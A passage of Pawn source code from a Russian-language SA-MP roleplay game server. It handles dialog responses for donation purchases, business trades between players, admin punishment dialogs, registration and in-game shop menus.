				case 4: ShowPlayerDialog(playerid,276,DIALOG_STYLE_MSGBOX,"VIP","{FFFFFF}Вы действительно хотите приобрести VIP на 30 дней?\n\n{f7ae11}Вам будет доступно:{FFFFFF}\n\tPayDay в независимости от времени нахождения на сервере\n\tЗа PayDay вы получаете в два раза больше опыта\n\tСкиллы качаются в два раза быстрее\n\tИспользование команды /admins\n\tСамостоятельное увольнение из фракции (/vu)\n\tПри продаже имущества государству Вы будете получать 90%% от стоимости","Купить","Назад");
	            case 5:
				{
				    if(PlayerInfo[playerid][pDCar] > 2) return SendClientMessage(playerid,CREWARD,"Максимально иметь 3 транспорта");
				    if(PlayerInfo[playerid][pDonate] < 150)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    PlayerInfo[playerid][pDonate] -= 150;
				    PlayerInfo[playerid][pDCar]++;
					SendClientMessage(playerid,CREWARD,"Вы получили возможность иметь еще один транспрот");
				}
				case 6:
				{
				    if(PlayerInfo[playerid][pDonate] < 65)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    PlayerInfo[playerid][pPriz]++;
				    PlayerInfo[playerid][pDonate]-=65;
				    GiveInv(playerid,445,1);
					SendClientMessage(playerid,-1,"Вы купили кейс, чтобы открыть используйте {f7ae11}/opencase");
					
				}
				case 7: ShowPlayerDialog(playerid,232,DIALOG_STYLE_INPUT,"Создание семьи","{FFFFFF}Введите название семьи:\nНазвание семьи должно быть от 1 до 50.","Далее","Назад");
                case 8:
				{
				    if(PlayerInfo[playerid][pUl][2]) return SendClientMessage(playerid,CGREY,"У Вас уже купленно данное улучшение");
				    if(PlayerInfo[playerid][pDonate] < 50)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    PlayerInfo[playerid][pUl][2] = 1;
				    PlayerInfo[playerid][pDonate]-=50;
					SendClientMessage(playerid,CREWARD,"Вы купили увелечение места в интвентаре");

				}
				case 9: ShowPlayerDialog(playerid,461,DIALOG_STYLE_LIST,"Наборы","1 | Набор новичка{f7ae11} [150 Donate Point]{FFFFFF}\n2 | Набор средний{f7ae11} [250 Donate Point]{FFFFFF}\n3 | Набор премиум{f7ae11} [1000 Donate Point]{FFFFFF}\n4 | Информация о наборах","Далее","Отмена");
			}
		}

		case 142:
		{
		    if(!response) return cmd_menu(playerid,"");
			new text;
			if(sscanf(inputtext, "i",text) || text < 1) return ShowPlayerDialog(playerid,142,DIALOG_STYLE_INPUT,"Обменять игровую валюту","{FFFFFF}Введите сколько хотите обменять доната:\nКурс: {f7ae11}1 Donate Point - $300","Далее","Назад");
			if(text > PlayerInfo[playerid][pDonate])
			{
			    SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
       			ShowPlayerDialog(playerid,142,DIALOG_STYLE_INPUT,"Обменять игровую валюту","{FFFFFF}Введите сколько хотите обменять доната:\nКурс: {f7ae11}1 Donate Point - $300","Далее","Назад");
			    return true;
			}
			PlayerInfo[playerid][pDonate] -= text;
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Обменял донат на деньги (+%d$)','%d')",PlayerInfo[playerid][pID],text*300,gettime());
			mysql_tquery(mysql,query);
			GiveMoney(playerid,text*300);
		}
		case 143:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"CBid");
		        DeletePVar(playerid,"CBcena");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"CBid"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			if(!GetPlayerBiz(GetPVarInt(playerid,"CBid"))) return SendClientMessage(playerid,CGREY,"Игрок не владеет бизнесом!");
			if(GetPred(GetPVarInt(playerid,"CBid")) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	    	SendClientMessage(playerid,CREWARD,"Вы предложили игроку обменяться бизнесами");
   			static const fmt_string1[] = "%s предложил Вам обменяться бизнесами. С Вашей доплатой: $%i";
			new str1[sizeof(fmt_string1)+32+10+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"CBcena"));
			SendClientMessage(GetPVarInt(playerid,"CBid"),0xFF7F50FF,str1);
			SendClientMessage(GetPVarInt(playerid,"CBid"),CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(GetPVarInt(playerid,"CBid"),"CbizID",playerid);
			SetPVarInt(GetPVarInt(playerid,"CBid"),"CbizCena",GetPVarInt(playerid,"CBcena"));
			DeletePVar(playerid,"CBid");
			DeletePVar(playerid,"CBcena");
		}
		case 144:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"CbizID");
		        DeletePVar(playerid,"CbizCena");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"CbizID"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
		        DeletePVar(playerid,"CbizID");
		        DeletePVar(playerid,"CbizCena");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
			if(!GetPlayerBiz(GetPVarInt(playerid,"CbizID")))
			{
		        DeletePVar(playerid,"CbizID");
		        DeletePVar(playerid,"CbizCena");
				return SendClientMessage(playerid,CGREY,"У Игрока нет бизнес");
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"CbizCena"))
			{
   				DeletePVar(playerid,"CbizID");
		        DeletePVar(playerid,"CbizCena");
				return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
			strmid(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bOwner], PlayerInfo[GetPVarInt(playerid,"CbizID")][pSendername], 0, strlen(PlayerInfo[GetPVarInt(playerid,"CbizID")][pSendername]), 32);
			strmid(BizInfo[GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz")][bOwner], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
			strmid(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bMen], "None", 0, strlen("None"), 32);
			strmid(BizInfo[GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz")][bMen], "None", 0, strlen("None"), 32);
            query = "";
			format(query, sizeof(query), "UPDATE `biz` SET `owner` = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[GetPVarInt(playerid,"CbizID")][pSendername], GetPVarInt(playerid,"PlayerBiz"));
			mysql_tquery(mysql,query);
			query = "";
			format(query, sizeof(query), "UPDATE `biz` SET `owner` = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername], GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz"));
			mysql_tquery(mysql,query);
			GiveMoney(playerid,-GetPVarInt(playerid,"CbizCena"));
			GiveMoney(GetPVarInt(playerid,"CbizID"),GetPVarInt(playerid,"CbizCena"));
			SendClientMessage(playerid,CREWARD,"Вы объяменялись бизнесами с игроком");
			SendClientMessage(GetPVarInt(playerid,"CbizID"),CREWARD,"Вы объяменялись бизнесами с игроком");
			query = "";
            format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Обменял бизнес №%d на №%d с %s (+%d$')",PlayerInfo[GetPVarInt(playerid,"CbizID")][pID],GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz"),GetPVarInt(playerid,"PlayerBiz"),PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"CbizCena"),gettime());
			mysql_tquery(mysql,query);
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Обменял бизнес №%d на №%d с %s (-%d$')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"PlayerBiz"),GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz"),PlayerInfo[GetPVarInt(playerid,"CbizID")][pSendername],GetPVarInt(playerid,"CbizCena"),gettime());
			mysql_tquery(mysql,query);
			
			new kek = GetPVarInt(playerid,"PlayerBiz");
			SetPVarInt(playerid,"PlayerBiz",GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz"));
			SetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz",kek);
			UpdateBiz(GetPVarInt(playerid,"PlayerBiz"));
			UpdateBiz(GetPVarInt(GetPVarInt(playerid,"CbizID"),"PlayerBiz"));
			DeletePVar(playerid,"CbizCena");
			DeletePVar(playerid,"CbizID");
		}
		case 145:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"CBid");
		        DeletePVar(playerid,"CBcena");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"CBid"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			if(GetPlayerBiz(GetPVarInt(playerid,"CBid"))) return SendClientMessage(playerid,CGREY,"У Игрока есть бизнес");
			if(GetPred(GetPVarInt(playerid,"CBid")) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	    	SendClientMessage(playerid,CREWARD,"Вы предложили игроку купить бизнес");
   			static const fmt_string1[] = "%s предложил Вам купить бизнес. Цена: $%i";
			new str1[sizeof(fmt_string1)+32+10+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"CBcena"));
			SendClientMessage(GetPVarInt(playerid,"CBid"),0xFF7F50FF,str1);
			SendClientMessage(GetPVarInt(playerid,"CBid"),CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(GetPVarInt(playerid,"CBid"),"CbizID1",playerid);
			SetPVarInt(GetPVarInt(playerid,"CBid"),"CbizCena1",GetPVarInt(playerid,"CBcena"));
			DeletePVar(playerid,"CBid");
			DeletePVar(playerid,"CBcena");
		}
		case 146:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"CbizID1");
		        DeletePVar(playerid,"CbizCena1");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"CbizID1"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
		        DeletePVar(playerid,"CbizID1");
		        DeletePVar(playerid,"CbizCena1");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
			if(!GetPlayerBiz(GetPVarInt(playerid,"CbizID1")))
			{
		        DeletePVar(playerid,"CbizID1");
		        DeletePVar(playerid,"CbizCena1");
				return SendClientMessage(playerid,CGREY,"У Игрока нет бизнес");
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"CbizCena1"))
			{
   				DeletePVar(playerid,"CbizID1");
		        DeletePVar(playerid,"CbizCena1");
				return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
			strmid(BizInfo[GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz")][bOwner], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
			strmid(BizInfo[GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz")][bMen], "None", 0, strlen("None"), 32);
            query = "";
			format(query, sizeof(query), "UPDATE `biz` SET `owner` = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername], GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz"));
			mysql_tquery(mysql,query);
			GiveMoney(playerid,-GetPVarInt(playerid,"CbizCena1"));
			GiveMoney(GetPVarInt(playerid,"CbizID1"),GetPVarInt(playerid,"CbizCena1"));
			SendClientMessage(GetPVarInt(playerid,"CbizID1"),CREWARD,"Вы продали бизнес игроку");
			SendClientMessage(playerid,CREWARD,"Вы купили бизнес у игрока");
            query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Купил бизнес №%d у %s (-%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz"),PlayerInfo[GetPVarInt(playerid,"CbizID1")][pSendername],GetPVarInt(playerid,"CbizCena1"),gettime());
			mysql_tquery(mysql,query);
            query = "";
            format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Купил бизнес №%d у %s (-%d$)','%d')",PlayerInfo[GetPVarInt(playerid,"CbizID1")][pID],GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz"),PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"CbizCena1"),gettime());
			mysql_tquery(mysql,query);
			
			UpdateBiz(GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz"));
			SetPVarInt(playerid,"PlayerBiz",GetPVarInt(GetPVarInt(playerid,"CbizID1"),"PlayerBiz"));
			DeletePVar(playerid,"CbizCena1");
			DeletePVar(playerid,"CbizID1");
		}
		case 147:
		{
			switch(response)
			{
			    case 1: EditObject(playerid,GetPVarInt(playerid,"Select")),DeletePVar(playerid,"Select");
				default: DestroyObject(GetPVarInt(playerid,"Select")),DeletePVar(playerid,"Select");
			}
		}
		case 149:
		{
		    if(!response) return true;
		  //  if(listitem+1 == F_FBI ) return SendClientMessage(playerid,CGREY,"Фракции недоступны");
   			PlayerInfo[playerid][pVipis] = 0;
			PlayerInfo[playerid][pRank] = 9;
			PlayerInfo[playerid][pMember] = listitem+1;
			PlayerInfo[playerid][pWork] = 1;
			PlayerInfo[playerid][pSpawnChange] = 1;
			static const fmt_string1[] = "Теперь вы в организации \"%s\"";
			new str1[sizeof(fmt_string1)+32];
   			format(str1, sizeof(str1), fmt_string1,FracInfo[listitem+1][fName]);
   			SendClientMessage(playerid,CREWARD,str1);
			SetPlayerInt(PlayerInfo[playerid][pSendername],"member",PlayerInfo[playerid][pMember]);
			SetPlayerInt(PlayerInfo[playerid][pSendername],"rank",PlayerInfo[playerid][pRank]);
			if(IsAGang(playerid) || IsAMafia(playerid))
			{
				if(CaptInfo[PlayerInfo[playerid][pMember]-6][capture]) CaptGo(playerid);
			}
			SetColor(playerid);
			SpawnPlayer(playerid);
		}
		case 148:
		{
		    if(!response) return true;
			new job = (GetPVarInt(playerid,"Actor") > 3) ? (GetPVarInt(playerid,"Actor")-4) : (GetPVarInt(playerid,"Actor"));
		    if(PlayerInfo[playerid][pJob] == job+56)
		    {
			    ApplyDynamicActorAnimation(JobBot[GetPVarInt(playerid,"Actor")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(JobBotText[GetPVarInt(playerid,"Actor")],-1,"Вы уже работаете у нас");
				SetTimerEx("ClearBotGlobal", 3000, false, "dd", JobBot[GetPVarInt(playerid,"Actor")],_:JobBotText[GetPVarInt(playerid,"Actor")]);
				return true;
		    }
		    
		    PlayerInfo[playerid][pJob] = job+56;
      		if(GetPVarInt(playerid,"Mar") > 0) ClearJob(playerid);
		    ApplyDynamicActorAnimation(JobBot[GetPVarInt(playerid,"Actor")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(JobBotText[GetPVarInt(playerid,"Actor")],-1,"Поздравляю вы приняты");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", JobBot[GetPVarInt(playerid,"Actor")],_:JobBotText[GetPVarInt(playerid,"Actor")]);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"О работе","{FFFFFF}Вы были приняты на работу!\nДля того, чтобы начать работать арендуйте рабочий транспорт\n\nКоманды для работы: {f7ae11}/mm » Команды » Работа","Закрыть","");
		}
		case 150:
		{
		    if(!response) return true;
		    new color[60];
		    if(sscanf(inputtext, "p<,>s[60]",color)) return ShowPlayerDialog(playerid, 150, DIALOG_STYLE_INPUT, "Kick", "{FFFFFF}Введите причину кика:\n\n", "Далее","Отмена");
		    new str[80];
		    format(str,sizeof(str),"%d %s",GetPVarInt(playerid,"SpecID"),color);
		    cmd_kick(playerid,str);
		}
		case 151:
		{
		    if(!response) return true;
		    new color[60],den;
		    if(sscanf(inputtext, "p<,>is[60]",den,color)) return ShowPlayerDialog(playerid, 151, DIALOG_STYLE_INPUT, "Ban", "{FFFFFF}Введите время бана, причину:\n\nПример: 15,Читы", "Далее","Отмена");
		    new str[80];
		    format(str,sizeof(str),"%d %d %s",GetPVarInt(playerid,"SpecID"),den,color);
		    cmd_ban(playerid,str);
		}
		case 152:
		{
		    if(!response) return true;
		    new color[60],den;
		    if(sscanf(inputtext, "p<,>is[60]",den,color)) return ShowPlayerDialog(playerid, 152, DIALOG_STYLE_INPUT, "Jail", "{FFFFFF}Введите время, причину:\n\nПример: 10,SK", "Далее","Отмена");
		    new str[80];
		    format(str,sizeof(str),"%d %d %s",GetPVarInt(playerid,"SpecID"),den,color);
		    cmd_jail(playerid,str);
		}
		case 153:
		{
		    if(!response) return true;
		    new color[60],den;
		    if(sscanf(inputtext, "p<,>is[60]",den,color)) return ShowPlayerDialog(playerid, 153, DIALOG_STYLE_INPUT, "Mute", "{FFFFFF}Введите время мута, причину:\n\nПример: 100,Оск", "Далее","Отмена");
		    new str[80];
		    format(str,sizeof(str),"%d %d %s",GetPVarInt(playerid,"SpecID"),den,color);
		    cmd_mute(playerid,str);
		}
		case 154:
		{
		    if(!response) return Kick(playerid, FIX_FUNCTION, 1200);
		    new text[50];
      		if(sscanf(inputtext, "s[50]",text)) return ShowPlayerDialog(playerid, 154, DIALOG_STYLE_INPUT, "Регистрация | Шаг [3/8]","{FFFFFF}Введите существующий адрес электронной почты.\nОн может понадобиться для восстановления пароля вашего аккаунта.", "Далее", "");
            for(new i = strlen(inputtext); i != 0; --i)
			switch(inputtext[i])
			{
			case 'А'..'Я', 'а'..'я', ' ':
				return ShowPlayerDialog(playerid, 154, DIALOG_STYLE_INPUT, "Регистрация | Шаг [3/8]","{FFFFFF}Введите существующий адрес электронной почты.\nОн может понадобиться для восстановления пароля вашего аккаунта.", "Далее", "");
			}
			if(strfind(inputtext, "@", true) == -1 || strfind(inputtext, ".", true) == -1)
			{
				SendClientMessage(playerid, CGREY, "Ошибка при вводе Email, попробуйте еще раз!");
				return ShowPlayerDialog(playerid, 154, DIALOG_STYLE_INPUT, "Регистрация | Шаг [3/8]","{FFFFFF}Введите существующий адрес электронной почты.\nОн может понадобиться для восстановления пароля вашего аккаунта.", "Далее", "");
			}
			strmid(PlayerInfo[playerid][pMail], inputtext, 0, strlen(inputtext), 50);
			ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Кто Вас пригласил | Шаг [4/8]", "{FFFFFF}Введите никнейм человека, который пригласил вас на сервер и нажмите 'Далее'.\nЕсли желаете пропустить данный пункт регистрации, просто нажмите 'Пропустить'.", "Готово","Пропустить");
		}
		case 156:
		{
		    if(!response) return DeletePVar(playerid,"IDTar");
		    switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,157,DIALOG_STYLE_LIST,"Общие действия","{FFFFFF}Показать паспорт\nПоказать лицензии\nПоказать выписку из тира","Выбрать","Отмена");
		        case 1:
				{
			    	switch(PlayerInfo[playerid][pMember])
					{
					    case F_LIC: ShowPlayerDialog(playerid,307,DIALOG_STYLE_LIST,"Действия организации","{FFFFFF}Показать удостоверение\nНачать тест","Выбрать","Отмена");
					    case F_HOSPITAL_LS: ShowPlayerDialog(playerid,307,DIALOG_STYLE_LIST,"Действия организации","{FFFFFF}Показать удостоверение\nПредложить вылечиться\nПредложить сменить пол\nПредложить пройти курс от наркозависимости\nИзбавить от ломки","Выбрать","Отмена");
						case F_ARMY,F_NEWS: ShowPlayerDialog(playerid,307,DIALOG_STYLE_LIST,"Действия организации","{FFFFFF}Показать удостоверение","Выбрать","Отмена");
						case F_MAYOR: ShowPlayerDialog(playerid,307,DIALOG_STYLE_LIST,"Действия организации","{FFFFFF}Показать удостоверение\nВыпустить из тюрьмы","Выбрать","Отмена");
						case F_LVPD,F_FBI: ShowPlayerDialog(playerid,307,DIALOG_STYLE_LIST,"Действия организации","{FFFFFF}Показать удостоверение\nОбыскать\nНадеть/снять наручники\nТащить/не тащить игрока","Выбрать","Отмена");
						default: SendClientMessage(playerid,CGREY,"Вам недоступны действия организации");
					}
				}
			}
		}
		case 157:
		{
		    if(!response) return DeletePVar(playerid,"IDTar");
		    new str[4];
		    format(str,sizeof(str),"%i",GetPVarInt(playerid,"IDTar"));
		    switch(listitem)
		    {
		        case 0: cmd_showpass(playerid,str);
		        case 1: cmd_lic(playerid,str);
		        case 2: cmd_skill(playerid,str);
		    }
		}
	
	    case 158:
	    {
	        if(!response) return true;
	        
	        new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem+6];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem+6];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
					if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
					
			    }
			    case 1:
			    {
					new obj = CreateDynamicObject(331, 295.73, -81.63, 1001.73, 0.00, 0.00, 0.00,-1,-1,playerid);
				    Streamer_UpdateEx(playerid,295.73, -81.63, 1001.73,-1,-1);
					//MoveDynamicObject(obj, 295.73, -81.63, 1001.73, 0.0005, 0.0, 0.0, 180.0);
					SetPVarInt(playerid,"AmmoObj",obj);
					SetPlayerCameraPos(playerid,295.889801,-80.338249,1002.015686);
 					SetPlayerCameraLookAt(playerid,295.870300,-81.328163,1001.875366);
					TogglePlayerControllable(playerid, 0);
					new str2[10];
					PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],"knuckles");
					format(str2,sizeof(str2),"%d$", ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0]);
					PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],str2);
					SetPVarInt(playerid,"BuyAmmo",1);

					DeletePVar(playerid,"SelectAmmo");
					SetPVarInt(playerid,"AmmoGun",1);
					SetPVarInt(playerid,"AmmoSkok",1);
					for(new x = 5; x < 18; x++) TextDrawShowForPlayer(playerid,ObjectBuy[x]);
					for(new x = 1; x < 3; x++) PlayerTextDrawShow(playerid,ObjectBuyP[x][playerid]);
					SelectTextDraw(playerid, CGREY);
					SetPVarInt(playerid,"AmmoGun",1);
					
					
					
			    }
			    
			    case 2:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить позаниматься в тире?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,286,DIALOG_STYLE_MSGBOX,"Занятие в тире",string1,"Да","Нет");
				}
				case 3:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Бронижелет?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,302,DIALOG_STYLE_MSGBOX,"Покупка Бронижелета",string1,"Да","Нет");

				}
		/*	    case 1:
			    {
					
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Кастет?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Кастета",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);
				
					SetPVarInt(playerid,"AmmoSkok",1);
		
			    }
			    case 2:
			    {
			        
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Биту?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Биты",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",5);
			
					SetPVarInt(playerid,"AmmoSkok",1);
			    }
				case 3:
				{
			        
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Дымовые шашки (10 шт.)?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Дымовых шашек",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",17);
					SetPVarInt(playerid,"AmmoSkok",10);
				}
				case 4:
				{
			        
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Desert Eagle (60 пт.)?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Desert Eagle",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",24);
					SetPVarInt(playerid,"AmmoSkok",60);
				}
				case 5:
				{
			        
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Shotgun (30 пт.)?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Shotgun",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",25);
					SetPVarInt(playerid,"AmmoSkok",30);
				}
				case 6:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить AK-47 (90 пт.)?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка AK-47",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",30);
					SetPVarInt(playerid,"AmmoSkok",90);
				}
				case 7:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Country Rifle (30 пт.)?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,44,DIALOG_STYLE_MSGBOX,"Покупка Country Rifle",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",33);
					SetPVarInt(playerid,"AmmoSkok",30);
				}
				case 8:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить позаниматься в тире?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,286,DIALOG_STYLE_MSGBOX,"Занятие в тире",string1,"Да","Нет");
				}
				case 9:
				{

					static const fmt_str1[] = "{FFFFFF}Вы хотите купить Бронижелет?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1, cena);
					ShowPlayerDialog(playerid,302,DIALOG_STYLE_MSGBOX,"Покупка Бронижелета",string1,"Да","Нет");
					
				}*/

			}

	    }
	    case 159:
	    {
	        if(!response) return true;
	        new cena = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][listitem];
	        new prods = ProdInfo[GetPVarInt(playerid,"PBIZ")][prodMinus][listitem];
	        SetPVarInt(playerid,"AmmoProd",prods);
	        SetPVarInt(playerid,"AmmoPrice",cena);
	        if(!BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4]) listitem++;
			switch(listitem)
			{
			    case 0:
			    {
					if(!GetPVarInt(playerid,"Oplata"))
					{
					    ShowPlayerDialog(playerid,467,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
					}
					else
					{
						DeletePVar(playerid,"Oplata");
						ShowMenuBiz(playerid);
					}
			    }
	      		case 1:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить телефон?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,75,DIALOG_STYLE_MSGBOX,"Покупка телефона",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);
					
				}
				case 2:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить сим-карту?\nЦена: $%i\nВведите какой номер хотите приобрести:";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,76,DIALOG_STYLE_INPUT,"Покупка сим-карты",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);
				}
				case 3:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить аптечку?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,77,DIALOG_STYLE_MSGBOX,"Покупка аптечки",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",1);

				}
				case 4:
				{
					
					static const fmt_str1[] = "{FFFFFF}Вы хотите купить маску?\nЦена: $%i";
					new string1[sizeof(fmt_str1)+5];
					format(string1, sizeof(string1), fmt_str1,cena);
					ShowPlayerDialog(playerid,77,DIALOG_STYLE_MSGBOX,"Покупка маски",string1,"Да","Нет");
					SetPVarInt(playerid,"AmmoGun",2);

				}
